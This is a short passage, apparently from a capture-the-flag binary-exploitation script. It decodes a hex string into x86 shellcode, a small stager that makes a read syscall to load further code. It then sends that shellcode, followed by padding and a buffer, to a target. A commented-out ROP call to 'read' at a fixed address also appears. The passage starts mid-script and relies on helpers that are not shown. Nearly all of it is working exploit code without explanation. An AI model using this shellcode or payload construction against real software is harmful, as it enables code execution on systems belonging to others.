...
import binascii
# payload = rop.call('read', 0,0x0804A028,0x20) +p32(0x0804A028)
payload = binascii.unhexlify("5031db5968000100005a6a0358cd80")

sd(payload)

sd("a"*len(payload)+buf)
